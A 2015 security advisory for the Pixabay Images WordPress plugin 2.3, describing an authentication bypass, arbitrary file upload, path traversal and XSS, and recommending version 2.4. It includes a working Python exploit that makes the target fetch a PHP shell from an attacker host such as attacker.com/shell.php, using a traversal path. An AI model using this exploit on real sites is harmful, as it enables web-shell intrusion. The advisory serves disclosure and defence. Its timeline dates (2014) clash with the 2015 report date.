@@ -1,0 +1,118 @@
+Mogwai Security Advisory MSA-2015-01
+----------------------------------------------------------------------
+Title:              WP Pixarbay Images Multiple Vulnerabilities
+Product:            Pixarbay Images (Wordpress Plugin)
+Affected versions:  2.3
+Impact:             high
+Remote:             yes
+Product link:       https://wordpress.org/plugins/pixabay-images/
+Reported:           14/01/2015
+by:                 Hans-Martin Muench (Mogwai, IT-Sicherheitsberatung Muench)
+
+
+Vendor's Description of the Software:
+----------------------------------------------------------------------
+Pixabay Images is a WordPress plugin that let's you pick CC0 public 
+domain pictures from Pixabay and insert them with just a click anywhere 
+on your blog. The images are safe to use, and paying attribution or 
+linking back to the source is not required.
+
+
+Business recommendation:
+----------------------------------------------------------------------
+Update to version 2.4
+
+Vulnerability description:
+----------------------------------------------------------------------
+1) Authentication bypass
+The plugin does not correctly check if the user is logged in. Certain
+code can be called without authentication
+
+2) Arbitrary file upload
+The plugin code does not validate the host in the provided download URL,
+which allows to upload malicious files, including PHP code.
+
+3) Path Traversal
+Certain values are not sanitized before they are used in a file operation.
+This allows to store files outside of the "download" folder. 
+
+4) Cross Site Scripting (XSS)
+The generated author link uses unsanitized user values which can be
+abused for Cross Site Scripting (XSS) attacks. 
+
+
+Proof of concept:
+----------------------------------------------------------------------
+The following PoC Python script can be used to download PHP files from
+a attacker controlled host.
+
+#!/usr/bin/env python
+
+import argparse
+import httplib, urllib
+from urlparse import urlparse
+
+def exploit(target_url, shellcode_url):
+
+target = urlparse(target_url)
+
+params = urllib.urlencode({'pixabay_upload': 1, 'image_url': shellcode_url,
+'image_user': 'none', 'q':'xxx/../../../../../../mogwai'})
+headers = headers = {"Content-type": "application/x-www-form-urlencoded"}
+
+print "[+] Sending download request...."
+conn = httplib.HTTPConnection(target.netloc)
+conn.request("POST", target.path + "/wp-admin/", params, headers)
+
+response = conn.getresponse()
+response_data = response.read()
+if response.status != 200 and response_data != "Error: File attachment metadata
+error":
+print "[-] Something went wrong"
+print response_data
+exit()
+
+conn.close()
+
+
+# ---- Main code ----------------
+parser = argparse.ArgumentParser()
+parser.add_argument("target_url", help="The target url, for example
+http://foo.bar/blog/")
+parser.add_argument("shellcode_url", help="The url of the PHP file that should
+be uploaded, for example: http://attacker.com/shell.php")
+
+print "----------------------------------------------"
+print " pixabay upload wordpress plugin exploit PoC"
+print " Mogwai security"
+print "----------------------------------------------"
+
+arguments = parser.parse_args()
+exploit(arguments.target_url, arguments.shellcode_url)
+
+
+
+
+Vulnerable / tested versions:
+----------------------------------------------------------------------
+Pixabay Images 2.3
+
+
+Disclosure timeline:
+----------------------------------------------------------------------
+14/01/2014: Reporting issues to the plugin author
+15/01/2014: Release of fixed version (2.4)
+19/01/2014: Public advisory
+
+
+Advisory URL:
+----------------------------------------------------------------------
+https://www.mogwaisecurity.de/#lab
+
+
+----------------------------------------------------------------------
+Mogwai, IT-Sicherheitsberatung Muench
+Steinhoevelstrasse 2/2
+89075 Ulm (Germany)
+
+info@mogwaisecurity.de
